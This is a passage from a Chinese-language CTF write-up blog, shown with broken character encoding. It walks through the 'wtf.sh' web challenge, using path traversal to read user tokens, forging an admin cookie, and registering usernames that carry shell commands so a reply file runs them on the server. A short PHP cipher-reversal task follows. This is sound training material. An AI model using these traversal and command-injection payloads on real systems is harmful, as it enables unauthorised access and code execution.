<p>5ã€äºæ˜¯æŠ“åŒ…ä¸€ä¸‹æ³¨å†Œçš„è´¦æˆ·ï¼Œå‘ç°Cookieä¸­æœ‰Tokenå­—æ®µï¼Œåº”è¯¥æ˜¯è¦é€šè¿‡æ–‡ä»¶è¯»å–æ‹¿åˆ°adminçš„Tokenè¿›è¡Œä¼ªé€ ç™»é™†ï¼š<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/ADWorld-Writeup/20190814005736586.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æºç ä¸­è¿˜æåˆ°äº†<code>/users</code>ç›®å½•ï¼Œäºæ˜¯æ„é€ <code>/post.wtf?post=../users</code>å³å¯è¯»åˆ°ï¼š<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/ADWorld-Writeup/20190814005958201.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä¼ªé€ CookieæˆåŠŸç™»é™†ï¼Œçœ‹åˆ°flag1ï¼š<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/ADWorld-Writeup/20190814010433593.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h6 id="Get-flag2"><a href="#Get-flag2" class="headerlink" title="Get flag2"></a>Get flag2</h6><p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://github.com/ernw/ctf-writeups/tree/master/csaw2016/wtf.sh">https://github.com/ernw/ctf-writeups/tree/master/csaw2016/wtf.sh</a></p>
<p>ä¸‹é¢å°±è¦è·å–flag2äº†ï¼Œç°åœ¨å°±åªæœ‰å†çœ‹çœ‹è·å–åˆ°çš„æºç ï¼Œå‘ç°å¦‚ä¸‹ä»£ç ï¼Œå‰é¢è¯´äº†ç½‘ç«™çš„åç¼€æ˜¯<code>.wtf</code>ï¼Œè§£æwtfæ–‡ä»¶çš„æºç å¦‚ä¸‹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">max_page_include_depth=64</span><br><span class="line">page_include_depth=0</span><br><span class="line"><span class="keyword">function</span> include_page &#123;</span><br><span class="line">    <span class="comment"># include_page pathname</span></span><br><span class="line">    <span class="built_in">local</span> pathname=<span class="variable">$1</span></span><br><span class="line">    <span class="built_in">local</span> cmd=</span><br><span class="line">    [[ <span class="variable">$&#123;pathname(-4)&#125;</span> = <span class="string">&#x27;.wtf&#x27;</span> ]];</span><br><span class="line">    <span class="built_in">local</span> can_execute=$;</span><br><span class="line">    page_include_depth=$((<span class="variable">$page_include_depth</span>+<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">if</span> [[ <span class="variable">$page_include_depth</span> -lt <span class="variable">$max_page_include_depth</span> ]]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">local</span> line;</span><br><span class="line">        <span class="keyword">while</span> <span class="built_in">read</span> -r line; <span class="keyword">do</span></span><br><span class="line">            <span class="comment"># check if we&#x27;re in a script line or not ($ at the beginning implies script line)</span></span><br><span class="line">            <span class="comment"># also, our extension needs to be .wtf</span></span><br><span class="line">            [[ $ = <span class="variable">$&#123;line01&#125;</span> &amp;&amp; <span class="variable">$&#123;can_execute&#125;</span> = 0 ]];</span><br><span class="line">            is_script=$;</span><br><span class="line">            <span class="comment"># execute the line.</span></span><br><span class="line">            <span class="keyword">if</span> [[ <span class="variable">$is_script</span> = 0 ]]</span><br><span class="line">            <span class="keyword">then</span></span><br><span class="line">                cmd+=$<span class="string">&#x27;n&#x27;</span><span class="variable">$&#123;line#$&#125;</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">if</span> [[ -n <span class="variable">$cmd</span> ]]</span><br><span class="line">                <span class="keyword">then</span></span><br><span class="line">                    <span class="built_in">eval</span> <span class="variable">$cmd</span>  <span class="built_in">log</span> Error during execution of <span class="variable">$&#123;cmd&#125;</span>;</span><br><span class="line">                    cmd=</span><br><span class="line">                <span class="keyword">fi</span></span><br><span class="line">                <span class="built_in">echo</span> <span class="variable">$line</span></span><br><span class="line">            <span class="keyword">fi</span></span><br><span class="line">        <span class="keyword">done</span>  <span class="variable">$&#123;pathname&#125;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> pMax include depth exceeded!p</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ç”±ä¸Šè¿°ä»£ç å¯çŸ¥ï¼Œ<code>.wtf</code>æ‰©å±•åçš„æ–‡ä»¶ï¼Œå†…å®¹è‹¥ä»¥<code>$</code>å¼€å¤´ï¼Œå³å¯æ‰§è¡Œåé¢çš„å‘½ä»¤ã€‚</p>
<p>å†åœ¨post_functions.shæ–‡ä»¶ä¸­çœ‹åˆ°replyåŠŸèƒ½çš„æºç ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> reply &#123;</span><br><span class="line">    <span class="built_in">local</span> post_id=<span class="variable">$1</span>;</span><br><span class="line">    <span class="built_in">local</span> username=<span class="variable">$2</span>;</span><br><span class="line">    <span class="built_in">local</span> text=<span class="variable">$3</span>;</span><br><span class="line">    <span class="built_in">local</span> hashed=$(hash_username <span class="string">&quot;<span class="variable">$&#123;username&#125;</span>&quot;</span>);</span><br><span class="line">    curr_id=$(<span class="keyword">for</span> d <span class="keyword">in</span> posts/<span class="variable">$&#123;post_id&#125;</span>/*; <span class="keyword">do</span> <span class="built_in">basename</span> <span class="variable">$d</span>; <span class="keyword">done</span> | <span class="built_in">sort</span> -n | <span class="built_in">tail</span> -n 1);</span><br><span class="line">    next_reply_id=$(awk <span class="string">&#x27;&#123;print $1+1&#125;&#x27;</span> &lt;&lt;&lt; <span class="string">&quot;<span class="variable">$&#123;curr_id&#125;</span>&quot;</span>);</span><br><span class="line">    next_file=(posts/<span class="variable">$&#123;post_id&#125;</span>/<span class="variable">$&#123;next_reply_id&#125;</span>);</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;username&#125;</span>&quot;</span> &gt; <span class="string">&quot;<span class="variable">$&#123;next_file&#125;</span>&quot;</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;RE: <span class="subst">$(nth_line 2 &lt; <span class="string">&quot;posts/<span class="variable">$&#123;post_id&#125;</span>/1&quot;</span>)</span>&quot;</span> &gt;&gt; <span class="string">&quot;<span class="variable">$&#123;next_file&#125;</span>&quot;</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;text&#125;</span>&quot;</span> &gt;&gt; <span class="string">&quot;<span class="variable">$&#123;next_file&#125;</span>&quot;</span>;</span><br><span class="line">    <span class="comment"># add post this is in reply to to posts cache</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;post_id&#125;</span>/<span class="variable">$&#123;next_reply_id&#125;</span>&quot;</span> &gt;&gt; <span class="string">&quot;users_lookup/<span class="variable">$&#123;hashed&#125;</span>/posts&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åœ¨replyåŠŸèƒ½ä¸­ï¼Œå½“ä½ å›å¤å¸–å­æ—¶ï¼Œä¼šé€šè¿‡GETæ–¹å¼æäº¤postå‚æ•°ä¼ é€’å¸–å­ID ï¼Œå¹¶ä¸”è¿™ä¸ªå‚æ•°ä¹Ÿå­˜åœ¨ç›®å½•éå†æ¼æ´ï¼Œè¿™æ ·å°±å¯ä»¥åœ¨æˆ‘ä»¬æƒ³è¦çš„åœ°æ–¹è¾“å‡ºåˆ›å»ºæ–‡ä»¶äº†ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œè¯¥å‡½æ•°è¿˜ä¼šå°†ç”¨æˆ·åå†™å…¥è¯¥æ–‡ä»¶ä¸­ã€‚</p>
<p>å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥æ³¨å†Œä¸€ä¸ªä»¥shellå‘½ä»¤ä¸ºç”¨æˆ·åçš„è´¦æˆ·ï¼Œå¹¶ä½¿ç”¨replyåŠŸèƒ½å°†å…¶å†™å…¥åˆ›å»ºçš„<code>.wtf</code>æ–‡ä»¶ï¼Œå°±å¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚</p>
<p>è¯¥å‡½æ•°è¿˜åœ¨æ–‡ä»¶çš„ç¬¬ä¸€è¡Œå†™äº†ç”¨æˆ·åã€‚å› æ­¤ï¼Œå¦‚æœæˆ‘ä»¬åªæ˜¯æ³¨å†Œäº†ä¸€ä¸ªåŒ…å«æœ‰æ•ˆshellå‘½ä»¤çš„ç”¨æˆ·åï¼Œå¹¶å°†å…¶å†™å…¥ä»¥.wtfç»“å°¾çš„æ–‡ä»¶åˆ°æˆ‘ä»¬å¯ä»¥è®¿é—®è¯¥æ–‡ä»¶çš„ç›®å½•ä¸­ï¼Œé‚£ä¹ˆå°±ä¼šç»™æˆ‘ä»¬æ‰§è¡Œä»£ç ã€‚å‘ç°users_lookupç›®å½•æ²¡æœ‰åŒ…å«<code>.noread</code>æ–‡ä»¶ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å°†.wtfæ–‡ä»¶å†™å…¥users_lookupã€‚</p>
<p>è¿˜æœ‰ä¸€ç‚¹éœ€è¦æ³¨æ„ï¼Œåœ¨æ³¨å†Œçš„æ—¶å€™ï¼Œç”¨æˆ·åä¸­å¦‚æœå‡ºç°ç©ºæ ¼åˆ™ä¼šå‡ºç°ä¸€äº›é”™è¯¯ï¼Œå¯ä»¥ç”¨<code>,</code>è¿›è¡Œç»•è¿‡ï¼Œå› æ­¤æ³¨å†Œç”¨æˆ·åä¸ºï¼š<code>$&#123;find,/,-iname,get_flag2&#125;</code>çš„è´¦æˆ·ï¼Œåœ¨replyçš„æ—¶å€™æŠ“åŒ…å¹¶ä¿®æ”¹postå‚æ•°å¦‚ä¸‹ï¼š<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/ADWorld-Writeup/20190814015029752.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><strong>æ³¨æ„ä¸Šé¢çš„<code>%09</code>ä¸ºæ°´å¹³åˆ¶è¡¨ç¬¦ï¼Œå¿…é¡»è¦åŠ ä¸Šï¼Œå¦åˆ™ä¼šå°†åç§°è§£é‡Šä¸ºç›®å½•åç§°ã€‚</strong></p>
<p>ç„¶åè®¿é—®<code>/users_lookup/lethe.wtf</code>å¾—åˆ°ï¼š<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/ADWorld-Writeup/2019081401563538.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>æœ€åï¼Œå†æ³¨å†Œä¸€ä¸ªç”¨æˆ·åä¸º<code>$/usr/bin/get_flag2</code>çš„è´¦æˆ·ï¼Œé‡å¤ä¸Šè¿°æ­¥éª¤å³å¯ã€‚<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/ADWorld-Writeup/20190814015929444.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<br>

<h1 id="web2ï¼ˆNSCTFï¼‰"><a href="#web2ï¼ˆNSCTFï¼‰" class="headerlink" title="web2ï¼ˆNSCTFï¼‰"></a>web2ï¼ˆNSCTFï¼‰</h1><p>1ã€è¿›å…¥é¢˜ç›®åç»™å‡ºäº†ä¸€ä¸ªåŠ å¯†å‡½æ•°çš„æºç ï¼Œæ€è·¯ä¹Ÿç›´æ¥å‘Šè¯‰ä½ äº†ï¼Œé€†å‡ºè§£å¯†å‡½æ•°ï¼Œå°†å¯†æ–‡è§£å¯†å‡ºæ¥å³å¯ã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$miwen</span>=<span class="string">&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;</span>; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123; </span><br><span class="line">    <span class="variable">$_o</span>=<span class="title function_ invoke__">strrev</span>(<span class="variable">$str</span>); </span><br><span class="line">    <span class="comment">// echo $_o; </span></span><br><span class="line">         </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$_0</span>=<span class="number">0</span>;<span class="variable">$_0</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$_o</span>);<span class="variable">$_0</span>++)&#123; </span><br><span class="line">        </span><br><span class="line">        <span class="variable">$_c</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$_o</span>,<span class="variable">$_0</span>,<span class="number">1</span>); </span><br><span class="line">        <span class="variable">$__</span>=<span class="title function_ invoke__">ord</span>(<span class="variable">$_c</span>)+<span class="number">1</span>; </span><br><span class="line">        <span class="variable">$_c</span>=<span class="title function_ invoke__">chr</span>(<span class="variable">$__</span>); </span><br><span class="line">        <span class="variable">$_</span>=<span class="variable">$_</span>.<span class="variable">$_c</span>;    </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_rot13</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_</span>))); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">   é€†å‘åŠ å¯†ç®—æ³•ï¼Œè§£å¯†$miwenå°±æ˜¯flag </span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ï¼ˆ2ï¼‰å¤§æ¦‚å®¡è®¡ä¸€äº›ä»£ç ï¼ŒåŠ å¯†æµç¨‹å¹¶ä¸å¤æ‚ï¼Œå³:<code>åè½¬å­—ç¬¦ä¸² =&gt; æ¯ä¸ªå­—ç¬¦çš„ASCIIåŠ 1 =&gt; base64ç¼–ç  =&gt; åè½¬å­—ç¬¦ä¸² =&gt; rot13ç¼–ç </code></p>
<p>æ‰€ä»¥è§£å¯†æµç¨‹åç€æ¥å°±è¡Œäº†ï¼Œå³ï¼š<code>rot13è§£ç  =&gt; åè½¬å­—ç¬¦ä¸² =&gt; base64è§£ç  =&gt; æ¯ä¸ªå­—ç¬¦çš„ASCIIåŠ 1 =&gt; åè½¬å­—ç¬¦ä¸²</code></p>
<p>ï¼ˆå¯¹rot13ç¼–ç è¿‡çš„å­—ç¬¦ä¸²åœ¨è¿›è¡Œä¸€æ¬¡rot13ç¼–ç å³ä¸ºè§£ç ï¼‰</p>
<p>è§£å¯†è„šæœ¬å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//rot13è§£å¯†=&gt;å­—ç¬¦ä¸²åè½¬=&gt;base64è§£å¯†=&gt;æ¯ä¸ªå­—ç¬¦çš„ASCIIå‡1=&gt;åè½¬å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="variable">$miwen</span>=<span class="string">&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$_o</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">str_rot13</span>(<span class="variable">$str</span>)));</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$_0</span>=<span class="number">0</span>;<span class="variable">$_0</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$_o</span>);<span class="variable">$_0</span>++)&#123;  <span class="comment">//2.æ¯ä¸ªå­—ç¬¦ascii+1</span></span><br><span class="line">        </span><br><span class="line">        <span class="variable">$_c</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$_o</span>,<span class="variable">$_0</span>,<span class="number">1</span>); </span><br><span class="line">        <span class="variable">$__</span>=<span class="title function_ invoke__">ord</span>(<span class="variable">$_c</span>)-<span class="number">1</span>; </span><br><span class="line">        <span class="variable">$_c</span>=<span class="title function_ invoke__">chr</span>(<span class="variable">$__</span>); </span><br><span class="line">        <span class="variable">$_</span>=<span class="variable">$_</span>.<span class="variable">$_c</span>;    </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">strrev</span>(<span class="variable">$_</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">decode</span>(<span class="variable">$miwen</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°ï¼š<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/ADWorld-Writeup/20190903170541198.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>

        </div>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>Lethe</span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>Permalink:</span>
                        <span><a href="https://lethe.site/2019/05/21/ADWorld-Writeup/">https://lethe.site/2019/05/21/ADWorld-Writeup/</a></span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) 2022 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                
                     <p class="copyright-item">
                         <span>Slogan:</span>
                         <span></span>
                     </p>
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/tags/Writeup/"># Writeup</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>Â· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2019/05/27/SSH-for-Kali/">å¯¹Kali Linuxè¿›è¡ŒSSHè¿œç¨‹æ§åˆ¶</a>
            
            
            <a class="next" rel="next" href="/2019/03/07/BugkuCTF-Writeup-Web/">BugkuCTF_Web_Writeup</a>
            
        </section>


    </article>
</div>

            </div>
            <footer id="footer" class="footer">
    <div class="copyright">
        <span>Life is a struggle.</span>
        <!-- <span>Â© Lethe | 2019 - 2022</span> -->
    </div>
</footer>

    </div>
</body>

</html>